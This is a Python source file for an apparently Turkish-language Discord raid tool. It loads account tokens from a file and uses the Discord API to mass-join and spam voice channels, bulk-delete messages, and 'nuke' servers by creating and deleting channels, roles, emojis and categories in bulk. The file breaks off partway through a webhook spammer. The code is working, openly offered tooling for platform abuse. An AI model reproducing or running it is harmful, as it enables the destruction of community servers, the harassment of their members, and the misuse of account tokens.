import ctypes
import json
import time
import random
import string
import os
import getpass
import sys
import base64
import concurrent.futures
import logging
#####################################################
try:
    import requests
    import colored
    import pystyle
    import datetime
    import keyboard
    import tkinter
    import tls_client
    import threading
    import easygui
    import colorama
    import pynput
    import websocket
    import fake_useragent
    import httpx
    import emoji as emojizer
    import bs4
    import discum
    import discord
except ModuleNotFoundError:
    os.system('pip install requests')
    os.system('pip install colored')
    os.system('pip install pystyle')
    os.system('pip install datetime')
    os.system('pip install keyboard')
    os.system('pip install tkinter')
    os.system('pip install tls_client')
    os.system('pip install threading')
    os.system('pip install easygui')
    os.system('pip install colorama')
    os.system('pip install pynput')
    os.system('pip install websocket')
    os.system('pip install fake_useragent')
    os.system('pip install httpx')
    os.system('pip install emoji')
    os.system('pip install bs4')
    os.system('pip install discum==1.1.0')
    os.system('pip install discord')
#####################################################
from bs4 import BeautifulSoup
from colorama import Fore, Style
from random import choice
from websocket import WebSocket
from tls_client import Session
from pystyle import Write, System, Colors, Colorate, Anime
from colored import fg
from json import dumps
from pynput import keyboard as ks
from concurrent.futures import ThreadPoolExecutor
from os.path import isfile, join
from discord.ext import commands
#####################################################
def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text
#####################################################
def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

session = tls_client.Session(
    client_identifier="chrome_116",
)
chrome_version = "116"
xsup = "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVzIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTYuMC4xOTM4LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTE2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjIyNTg3MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="

#####################################################
red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT
#####################################################
print(f'{Fore.CYAN} Sistem kontrol ediliyor...')
time.sleep(2)
System.Clear()
ctypes.windll.kernel32.SetConsoleTitleW(f'Made By : Carpy | DC: .gg/insafsiz |')
username = getpass.getuser()
print(f"""
\t         
\t           
\t      
\t                                       
\t 
\t 
\t      
\t
\t                                                                                     
                                         ░█████╗░░█████╗░██████╗░██████╗░██╗░░░██╗  ██╗░░██╗  ██████╗░██╗░░██╗░█████╗░██╗░░░░░███████╗███████╗
                                         ██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝  ╚██╗██╔╝  ██╔══██╗██║░░██║██╔══██╗██║░░░░░██╔════╝██╔════╝
                                         ██║░░╚═╝███████║██████╔╝██████╔╝░╚████╔╝░  ░╚███╔╝░  ██████╔╝███████║██║░░██║██║░░░░░█████╗░░█████╗░░
                                         ██║░░██╗██╔══██║██╔══██╗██╔═══╝░░░╚██╔╝░░  ░██╔██╗░  ██╔═══╝░██╔══██║██║░░██║██║░░░░░██╔══╝░░██╔══╝░░
                                         ╚█████╔╝██║░░██║██║░░██║██║░░░░░░░░██║░░░  ██╔╝╚██╗  ██║░░░░░██║░░██║╚█████╔╝███████╗███████╗███████╗
                                         ░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░░░░╚═╝░░░  ╚═╝░░╚═╝  ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚══════╝╚══════╝╚══════╝
\t 
\t
\t                                                                                 
\t                            Hos Geldin {username} !
""")
def display_menu():
    print(Fore.LIGHTCYAN_EX + """
\t \t                
\t DISCORD API : V9/10 | .gg/insafsiz     
\t -> (T) : Token Menu 
\t -> (Y) : Yardım Ve İletisim
\t           
\t    1 - VC JOINER       
\t    2 - VC SPAMMER      
\t    3 - MESSAGE CLEANER  
\t    4 - TOKEN ONLİNE    
\t    5 - SERVER NUKER    
\t    6 - REPLY SPAMMER   
\t    7 - TOKEN JOINER    
\t \t                
\t \t    
    """)

def execute_command(command):
    if command == '1':
        ctypes.windll.kernel32.SetConsoleTitleW(f'Made By : Standby | DC: .gg/stanby |')
        Write.Print(f"\n[+] SUNUCU ID ~> ", Colors.purple_to_red, interval=0.000); server_id = input()
        Write.Print(f"[+] SES KANALI ID ~> ", Colors.purple_to_red, interval=0.000); channel_id = input()
        Write.Print(f"[+] KULAKLIK y/n ~> ", Colors.purple_to_red, interval=0.000); defean = input().lower()
        Write.Print(f"[+] MUTE y/n ~> ", Colors.purple_to_red, interval=0.000); mute = input().lower()
        Write.Print(f"[+] YAYIN y/n ~> ", Colors.purple_to_red, interval=0.000); stream = input().lower()
        Write.Print(f"[+] KAMERA y/n ~> ", Colors.purple_to_red, interval=0.000); video = input().lower()

        output_lock = threading.Lock()
        defean_voice = False
        mute_voice = False
        stream_voice = False
        video_voice = False
        if defean == "y":
            defean_voice = True
        if mute == "y":
            mute_voice = True
        if stream == "y":
            stream_voice = True
        if video == "y":
            video_voice = True
        print()
        def voice_joiner(token):
            while True:
                ws_voice = WebSocket()
                ws_voice.connect("wss://gateway.discord.gg/?v=8&encoding=json")
                ws_voice.send(dumps(
                    {
                        "op": 2,
                        "d": {
                            "token": token,
                            "properties": {
                                "$os": "windows",
                                "$browser": "Discord",
                                "$device": "desktop"
                            }
                        }
                    }))
                ws_voice.send(dumps({
                    "op": 4,
                    "d": {
                        "guild_id": server_id,
                        "channel_id": channel_id,
                        "self_mute": mute_voice,
                        "self_deaf": defean_voice, 
                        "self_stream?": stream_voice, 
                        "self_video": video_voice
                    }
                }))
                ws_voice.send(dumps({
                    "op": 18,
                    "d": {
                        "type": "guild",
                        "guild_id": server_id,
                        "channel_id": channel_id,
                        "preferred_region": "spain"
                    }
                }))
                ws_voice.send(dumps({
                    "op": 1,
                    "d": None
                }))

        def process_token(token):
            voice_joiner(token)

        def main():
            with open("tokens.txt", "r", encoding='utf-8') as f:
                tokens = f.read().splitlines()
                for token in tokens:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Sese Başarıyla Girdi {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        pass

            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(process_token, tokens)
        
        main()
        Write.Print(f"\nHer Hangi bir tusa bas ~> ", Colors.purple_to_red, interval=0.000); input()
        
    elif command == '4':
        os.system('cmd /k "o.py' if os.name == 'nt' else 'python o.py') 
    elif command == '7':
            os.system("node join.js")
            
    elif command == '2':
        ctypes.windll.kernel32.SetConsoleTitleW(f'Made By : Standby | Web : www.Standby.shop  |  Voice Spammer')
        Write.Print(f"\n[+] SUNUCU ID ~> ", Colors.purple_to_red, interval=0.000); server_id = input()
        Write.Print(f"[+] KANAL ID ~> ", Colors.purple_to_red, interval=0.000); channel_id = input()

        output_lock = threading.Lock()
        defean_voice = False
        mute_voice = False
        stream_voice = False
        video_voice = False
        print()
        def voice_joiner(token):
            while True:
                ws_voice = WebSocket()
                ws_voice.connect("wss://gateway.discord.gg/?v=8&encoding=json")
                ws_voice.send(dumps(
                    {
                        "op": 2,
                        "d": {
                            "token": token,
                            "properties": {
                                "$os": "windows",
                                "$browser": "Discord",
                                "$device": "desktop"
                            }
                        }
                    }))
                ws_voice.send(dumps({
                    "op": 4,
                    "d": {
                        "guild_id": server_id,
                        "channel_id": channel_id,
                        "self_mute": mute_voice,
                        "self_deaf": defean_voice, 
                        "self_stream?": stream_voice, 
                        "self_video": video_voice
                    }
                }))
                ws_voice.send(dumps({
                    "op": 18,
                    "d": {
                        "type": "guild",
                        "guild_id": server_id,
                        "channel_id": channel_id,
                        "preferred_region": "spain"
                    }
                }))
                ws_voice.send(dumps({
                    "op": 1,
                    "d": None
                }))
                time.sleep(0.5)
                numbers = random.randint(1, 6)
                if numbers == 1:
                    emoji = "🦆"
                elif numbers == 2:
                    emoji = "🔊"
                elif numbers == 3:
                    emoji = "🦗"
                elif numbers == 4:
                    emoji = "👏"
                elif numbers == 5:
                    emoji = "🎺"
                elif numbers == 6:
                    emoji = "🥁"
                else:
                    emoji = "🦆"
                    
                payload = {
                    "emoji_id": None,
                    "emoji_name": emoji,
                    "sound_id": numbers
                }

                headers = {
                    'authorization': token,
                    "accept": "*/*",
                    "accept-language": "en-GB",
                    "content-length": str(len(dumps(payload))),
                    "content-type": "application/json",
                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": xsup
                }

                r = session.post(f"https://discord.com/api/v9/channels/{channel_id}/voice-channel-effects", headers=headers, json=payload)
                if r.status_code == 204:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}${gray}) {pretty}Played Sound {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                time.sleep(2)
                ws_voice.close()
                time.sleep(1)

        def process_token(token):
            voice_joiner(token)

        def main():
            with open("tokens.txt", "r", encoding='utf-8') as f:
                tokens = f.read().splitlines()
                for token in tokens:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Spamming Voice... {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token + "\n", Colors.purple_to_red, interval=0.000)
                        pass

            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(process_token, tokens)
        
        main()
        
    elif command == 'T':
        os.system('cmd /k "t.py' if os.name == 'nt' else 'python t.py') 

    elif command == '3':
        ctypes.windll.kernel32.SetConsoleTitleW(f'Made By : Standby | Web : www.Standby.shop |')
        Write.Print(f"\ntoken ~> ", Colors.purple_to_red, interval=0.000); token = input()
        Write.Print(f"Kanal İD ~> ", Colors.purple_to_red, interval=0.000); channel_id = input()
        print()
        output_lock = threading.Lock()
        url = f'https://discord.com/api/v9/channels/{channel_id}/messages'

        headers = {
            'authorization': token,
        }
        
        r = session.get(url=url, headers=headers)
        msg = r.json()
        for m in msg:
            with output_lock:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}~{gray}) {pretty}Scraped Message ID {gray}| ", end='')
                sys.stdout.flush()
                Write.Print(str(m['id']) + "\n", Colors.purple_to_red, interval=0.000)
            with open(f"data/temp_delete.txt", "a+", encoding='utf-8') as f:
                f.write(str(m['id']) + "\n")

        time.sleep(10)

        def process_message(message_id):
            url_new = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}'
            session.delete(url=url_new, headers=headers)
            with output_lock:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Deleted Message {gray}| ", end='')
                sys.stdout.flush()
                Write.Print(message_id + "\n", Colors.purple_to_red, interval=0.000)

        threads = []

        with open("data/temp_delete.txt", "r", encoding='utf-8') as pene:
            r = pene.readlines()
            for msg_id in r:
                msg_id = msg_id.strip()
                t = threading.Thread(target=process_message, args=(msg_id,))
                threads.append(t)
                t.start()
                time.sleep(10)

        for t in threads:
            t.join()
        
        os.remove("data/temp_delete.txt")
        Write.Print(f"\npress_enter ~> ", Colors.purple_to_red, interval=0.000); input() 
        
    elif command == 'Y':
        print("------------------------------") 
        print("|       HERHANGI BIR SORUN OLURSA DC: PHOLEEE,CARPY         |") 
        print("|       DC : gg/insafsiz      |") 
        print("------------------------------") 

    elif command == '5':
        ctypes.windll.kernel32.SetConsoleTitleW(f'Made By Carpy | DC: .gg/insafsiz  | Server Nuker Menu')
        try:
            os.remove("data/temp_token.txt")
        except Exception:
            pass
        Write.Print(f"\ntoken ~> ", Colors.red_to_blue, interval=0.000); token_s = input(magenta)
        with open("data/temp_token.txt", "a+", encoding='utf-8') as f:
            f.write(token_s)
        System.Clear()
        Write.Print(f"""
\t\t███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗     ███╗   ███╗███████╗███╗   ██╗██╗   ██╗
\t\t████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗    ████╗ ████║██╔════╝████╗  ██║██║   ██║
\t\t██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝    ██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║
\t\t██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗    ██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║
\t\t██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║    ██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
\t\t╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ 
                        Giris Yapilan Hesap : {token_s[:20]}*******
------------------------------------------------------------------------------------------------------------
    \t\t\t(1) Channel Creator\t\t(9) Message Spammer
    \t\t\t(2) Channel Deleter
    \t\t\t(3) Role Creator
    \t\t\t(4) Role Deleter
    \t\t\t(5) Emoji Creator
    \t\t\t(6) Emoji Deleter
    \t\t\t(7) Category Creator
    \t\t\t(8) Category Deleter
------------------------------------------------------------------------------------------------------------
""", Colors.purple_to_red, interval=0.000)
        Write.Print(f"\n@-Standby TOOLS ~> ", Colors.red_to_blue, interval=0.000); opc2 = input(magenta).lower()
        if opc2=="1":
            ctypes.windll.kernel32.SetConsoleTitleW(f'Made By Standby | WEB SERVISI : ww.Standby.shop |  Server Nuker Menu | Channel Creator')
            def create_channel(guild_id, ch_name, token_s, output_lock):
                channel_types = ["0", "2"]
                randoma = random.choice(channel_types)
                headers = {
                    "Authorization": token_s
                }

                payload = {
                    "name": ch_name,
                    "parent_id": None,
                    "permission_overwrites": [],
                    "type": randoma
                }
                r = session.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=payload)
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Successfully Created {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(token_s + "\n", Colors.purple_to_red, interval=0.000)
                else:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({yellow}/{gray}) {pretty}Ratelimit{gray} | ", end='')
                        sys.stdout.flush()
                        Write.Print(token_s + "\n", Colors.purple_to_red, interval=0.000)
            
            def main():
                Write.Print(f"\nserver_id ~> ", Colors.purple_to_red, interval=0.000); guild_id = input()
                Write.Print(f"channel_name ~> ", Colors.purple_to_red, interval=0.000); ch_name = input()
                print()
                
                output_lock = threading.Lock()
                channel_types = ["0", "2"]

                threads = []

                with open("data/temp_token.txt", "r", encoding='utf-8') as f:
                    for line in f:
                        token_s = line

                for i in range(1000):
                    time.sleep(0.1)
                    thread = threading.Thread(target=create_channel, args=(guild_id, ch_name, token_s, output_lock))
                    threads.append(thread)
                    thread.start()

                for thread in threads:
                    thread.join()
            
            main()
            Write.Print(f"\npress_enter ~> ", Colors.purple_to_red, interval=0.000); input()
            
            os.remove("data/temp_token.txt")
        if opc2=="2":
            ctypes.windll.kernel32.SetConsoleTitleW(f'Made By Carpy | DC: .gg/insafsiz | Server Nuker Menu| Channel Deleter')
            output_lock = threading.Lock()
            def delete_channel(channel_id, headers, channel_name):
                url = f'https://discord.com/api/v9/channels/{channel_id}'
                response = session.delete(url=url, headers=headers)
                if response.status_code != 200:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(channel_id + f" | ({channel_name})\n", Colors.purple_to_red, interval=0.000)
                else:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Successfully Deleted {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(channel_id + f" | ({channel_name})\n", Colors.purple_to_red, interval=0.000)

            def main():
                with open("data/temp_token.txt", "r", encoding='utf-8') as f:
                    for line in f:
                        token_s = line
                
                Write.Print(f"\nserver_id ~> ", Colors.purple_to_red, interval=0.000); server_id = input()
                print()
                headers = {
                    'Authorization': token_s
                }

                url = f'https://discord.com/api/v10/guilds/{server_id}/channels'
                r = session.get(url=url, headers=headers).json()

                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                    futures = []
                    for a in r:
                        channel_id = a['id']
                        channel_name = a['name']
                        futures.append(executor.submit(delete_channel, channel_id, headers, channel_name))

                    concurrent.futures.wait(futures)
            main()
            Write.Print(f"\npress_enter ~> ", Colors.purple_to_red, interval=0.000); input()
            
            os.remove("data/temp_token.txt")
        if opc2=="3":
            ctypes.windll.kernel32.SetConsoleTitleW(f'Made By Carpy | DC: .gg/insafsiz | Server Nuker Menu | Role Creator')
            def create_role(server_id, token, name, output_lock):
                headers = {
                    'Authorization': token
                }
                
                na = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))
                color_list = [0, 1752220, 3066993, 15105570, 11027200, 12745742, 7419530, 11342935, 1752220, 1442563, 16712194, 16777215, 6506311]
                color = random.choice(color_list)

                payload = {
                    "color": color,
                    "name": name + f" | {na}",
                    "permissions": 0
                }

                url = f'https://discord.com/api/v9/guilds/{server_id}/roles'
                r = session.post(url=url, headers=headers, json=payload)
                if r.status_code != 200:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(name + f" | {na}\n", Colors.purple_to_red, interval=0.000)
                else:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Successfully Created Role {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(name + f" | {na}\n", Colors.purple_to_red, interval=0.000)

            def main():
                Write.Print(f"\nserver_id ~> ", Colors.purple_to_red, interval=0.000); server_id = input()
                Write.Print(f"role_names ~> ", Colors.purple_to_red, interval=0.000); name = input()
                role_names = [name]
                print()
                
                with open("data/temp_token.txt", "r", encoding='utf-8') as f:
                    for line in f:
                        token_s = line.strip()

                output_lock = threading.Lock()

                with concurrent.futures.ThreadPoolExecutor(max_workers=150) as executor:
                    futures = []
                    for i in range(200):
                        futures.append(executor.submit(create_role, server_id, token_s, name, output_lock))
                        time.sleep(0.01)

                concurrent.futures.wait(futures)
            main()
            Write.Print(f"\npress_enter ~> ", Colors.purple_to_red, interval=0.000); input()
            
            os.remove("data/temp_token.txt")
        if opc2=="4":
            ctypes.windll.kernel32.SetConsoleTitleW(f'Made By Carpy | DC: .gg/insafsiz | Server Nuker Menu | Role Deleter')
            def role_deleter(role_id, headers, role_name, server_id, output_lock):
                url = f"https://discord.com/api/v9/guilds/{server_id}/roles/{role_id}"
                r2 = session.delete(url=url, headers=headers)
                if r2.status_code != 204:
                    role_deleter(role_id, headers, role_name, server_id, output_lock)
                else:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Deleted Role {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(role_id + f" | ({role_name})\n", Colors.purple_to_red, interval=0.000)

            def main():
                output_lock = threading.Lock()
                with open("data/temp_token.txt", "r", encoding='utf-8') as f:
                    for line in f:
                        token_s = line
                
                Write.Print(f"\nserver_id ~> ", Colors.purple_to_red, interval=0.000); server_id = input()
                print()
                headers = {
                    'Authorization': token_s
                }
                url = f'https://discord.com/api/v9/guilds/{server_id}/roles'

                r = session.get(url=url, headers=headers).json()
                with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                    futures = []
                    for a in r:
                        role_name = a['name']
                        role_id = a['id']
                        futures.append(executor.submit(role_deleter, role_id, headers, role_name, server_id, output_lock))
                        time.sleep(0.09)

                    concurrent.futures.wait(futures)
            main()
            Write.Print(f"\npress_enter ~> ", Colors.purple_to_red, interval=0.000); input()
            
            os.remove("data/temp_token.txt")   
        if opc2=="5":
            ctypes.windll.kernel32.SetConsoleTitleW(f'Made By Carpy | DC: .gg/insafsiz | Server Nuker Menu | Emoji Creator')
            def emoji_creator(server_id, headers, output_lock):
                url = f'https://discord.com/api/v9/guilds/{server_id}/emojis'
                folder = 'data/images'
                names = os.listdir(folder)
                nm = names[0]
                name = nm.replace(".png", "").replace(".jpg", "").replace(".jpeg", "")

                penis = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
                payload = {
                    "image": 'data:image/png;base64,' + base64.b64encode(open(os.path.join("data/images", random.choice([f for f in os.listdir("data/images") if f.endswith('.jpg') or f.endswith('.png')])), 'rb').read()).decode('utf-8'),
                    "name": name
                }
                for i in range(50):
                    r = session.post(url=url, headers=headers, json=payload)
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Created Emoji {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(name + "\n", Colors.purple_to_red, interval=0.000)
            
            def main():
                output_lock = threading.Lock()
                with open("data/temp_token.txt", "r", encoding='utf-8') as f:
                    for line in f:
                        token_s = line
                
                Write.Print(f"\nserver_id ~> ", Colors.purple_to_red, interval=0.000); server_id = input()
                print()
                headers = {
                    'Authorization': token_s
                }

                with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                    futures = []
                    futures.append(executor.submit(emoji_creator, server_id, headers, output_lock))
                    time.sleep(0.09)

                concurrent.futures.wait(futures)
            main()
            Write.Print(f"\npress_enter ~> ", Colors.purple_to_red, interval=0.000); input()
            
            os.remove("data/temp_token.txt")   
        if opc2=="6":
            ctypes.windll.kernel32.SetConsoleTitleW(f'Made By Carpy | DC: .gg/insafsiz | Server Nuker Menu | Emoji Deleter')
            def emoji_deleter(server_id, headers, output_lock):
                url = f'https://discord.com/api/v9/guilds/{server_id}/emojis'
                r = session.get(url=url, headers=headers)
                f = r.json()
                for a in f:
                    id = a['id']
                    new_url = f'https://discord.com/api/v9/guilds/{server_id}/emojis/{id}'
                    r = session.delete(url=new_url, headers=headers)
                    if r.status_code == 204:
                        with output_lock:
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Deleted Emoji {gray}| ", end='')
                            sys.stdout.flush()
                            Write.Print(id + "\n", Colors.purple_to_red, interval=0.000)
                    else:
                        with output_lock:
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({yellow}/{gray}) {pretty}Ratelimit {gray}| ", end='')
                            sys.stdout.flush()
                            Write.Print(id + "\n", Colors.purple_to_red, interval=0.000)
            
            def main():
                output_lock = threading.Lock()
                with open("data/temp_token.txt", "r", encoding='utf-8') as f:
                    for line in f:
                        token_s = line
                
                Write.Print(f"\nserver_id ~> ", Colors.purple_to_red, interval=0.000); server_id = input()
                print()
                headers = {
                    'Authorization': token_s
                }

                with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                    futures = []
                    futures.append(executor.submit(emoji_deleter, server_id, headers, output_lock))

                concurrent.futures.wait(futures)
            main()
            Write.Print(f"\npress_enter ~> ", Colors.purple_to_red, interval=0.000); input()
            
            os.remove("data/temp_token.txt")   
        if opc2=="7":
            ctypes.windll.kernel32.SetConsoleTitleW(f'Made By Carpy | DC: .gg/insafsiz | Server Nuker Menu | Category Creator')
            def create_category(guild_id, ch_name, token_s, output_lock):
                headers = {
                    "Authorization": token_s
                }

                payload = {
                    "name": ch_name,
                    "permission_overwrites": [],
                    "type": 4
                }
                r = session.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=payload)
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Successfully Created {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(ch_name + "\n", Colors.purple_to_red, interval=0.000)
                else:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({yellow}/{gray}) {pretty}Ratelimit{gray} | ", end='')
                        sys.stdout.flush()
                        Write.Print(ch_name + "\n", Colors.purple_to_red, interval=0.000)
            
            def main():
                Write.Print(f"\nserver_id ~> ", Colors.purple_to_red, interval=0.000); guild_id = input()
                Write.Print(f"category_name ~> ", Colors.purple_to_red, interval=0.000); ch_name = input()
                print()
                
                output_lock = threading.Lock()

                threads = []

                with open("data/temp_token.txt", "r", encoding='utf-8') as f:
                    for line in f:
                        token_s = line

                for i in range(1000):
                    time.sleep(0.1)
                    thread = threading.Thread(target=create_category, args=(guild_id, ch_name, token_s, output_lock))
                    threads.append(thread)
                    thread.start()

                for thread in threads:
                    thread.join()
            
            main()
            Write.Print(f"\npress_enter ~> ", Colors.purple_to_red, interval=0.000); input()
            
            os.remove("data/temp_token.txt")
        if opc2=="8":
            ctypes.windll.kernel32.SetConsoleTitleW(f'Made By Carpy | DC: .gg/insafsiz | Server Nuker Menu | Category Deleter')
            output_lock = threading.Lock()
            def delete_channel(channel_id, headers, channel_name):
                url = f'https://discord.com/api/v9/channels/{channel_id}'
                response = session.delete(url=url, headers=headers)
                if response.status_code != 200:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Failed {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(channel_id + f" | ({channel_name})\n", Colors.purple_to_red, interval=0.000)
                else:
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Successfully Deleted {gray}| ", end='')
                        sys.stdout.flush()
                        Write.Print(channel_id + f" | ({channel_name})\n", Colors.purple_to_red, interval=0.000)
            
            def main():
                with open("data/temp_token.txt", "r", encoding='utf-8') as f:
                    for line in f:
                        token_s = line
                
                Write.Print(f"\nserver_id ~> ", Colors.purple_to_red, interval=0.000); server_id = input()
                print()
                headers = {
                    'Authorization': token_s
                }

                url = f'https://discord.com/api/v10/guilds/{server_id}/channels'
                r = session.get(url=url, headers=headers).json()

                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                    futures = []
                    for a in r:
                        channel_id = a['id']
                        channel_name = a['name']
                        futures.append(executor.submit(delete_channel, channel_id, headers, channel_name))

                    concurrent.futures.wait(futures)
            main()
            Write.Print(f"\npress_enter ~> ", Colors.purple_to_red, interval=0.000); input()
            
            os.remove("data/temp_token.txt")
        if opc2=="9":
            ctypes.windll.kernel32.SetConsoleTitleW(f'Made By Carpy | DC: .gg/insafsiz | Server Nuker Menu | Message Spammer')
            output_lock = threading.Lock()
            with open("data/temp_webhooks.txt", "w") as e:
                e.write("")
            def create_webhook(channel_id, headers):
                webhook_url = f"https://discord.com/api/v9/channels/{channel_id}/webhooks"
                data = {
                    "name": "Tool",
                }
                
                for _ in range(15):
                    response = session.post(webhook_url, headers=headers, json=data)
                    if response.status_code == 200:
                        with output_lock:
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Created Webhook {gray}| ", end='')
                            sys.stdout.flush()
                            Write.Print(channel_id + "\n", Colors.purple_to_red, interval=0.000)
                    else:
                        pass

            def get_webhooks(channel_id, headers):
                webhook_url = f"https://discord.com/api/v9/channels/{channel_id}/webhooks"
                a = session.get(url=webhook_url, headers=headers).json()
                for r in a:
                    wbhook = r['url']
                    with output_lock:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Scraped Webhook {gray}| ", end='')
                        sys.stdout.flush()
